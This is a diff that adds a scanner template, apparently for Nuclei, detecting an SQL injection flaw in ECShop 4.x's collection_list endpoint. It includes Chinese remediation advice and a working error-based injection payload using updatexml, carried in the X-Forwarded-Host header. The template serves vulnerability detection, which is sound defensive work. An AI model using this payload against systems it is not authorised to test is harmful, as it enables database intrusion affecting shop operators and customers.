@@ -1,0 +1,35 @@
+id: Ecshop-CollectionList-SQLi
+info:
+  name: ECShop 4.x collection_list SQL injection
+  author:
+  - l0ne1y
+  description: |-
+    ECShop 4.x collection_list SQL 注入
+    ECShop是一款专业的电商商城系统。
+
+    ECShop 4.x版存在SQL注入漏洞。攻击者可通过/user.php?act=collection_list参数利用该漏洞进行SQL注入攻击。
+  severity: high
+  remediation: |-
+    官方修复建议：
+    厂商尚未提供漏洞修复方案，请关注厂商主页更新：
+    https://www.ecshop.com/
+
+    临时修复方案：<br/>1、使用预编译语句，使用PDO需要注意不要将变量直接拼接到PDO语句中。所有的查询语句都使用数据库提供的参数化查询接口，参数化的语句使用参数而不是将用户输入变量嵌入到SQL语句中。当前几乎所有的数据库系统都提供了参数化SQL语句执行接口，使用此接口可以非常有效的防止SQL注入攻击。<br/>2、对进入数据库的特殊字符（’”<>&*;等）进行转义处理，或编码转换。<br/>3、确认每种数据的类型，比如数字型的数据就必须是数字，数据库中的存储字段必须对应为int型。
+requests:
+- matchers:
+  - type: word
+    part: body
+    words:
+    - '{{randstr}}'
+  - type: word
+    part: body
+    negative: true
+    words:
+    - updatexml
+  matchers-condition: and
+  path:
+  - '{{BaseURL}}/user.php?act=collection_list'
+  method: GET
+  headers:
+    X-Forwarded-Host: 45ea207d7a2b68c49582d2d22adf953apay_log|s:55:"1' and updatexml(1,insert({{randstr}},1,1,0x7e),1)
+      and '";|45ea207d7a2b68c49582d2d22adf953a
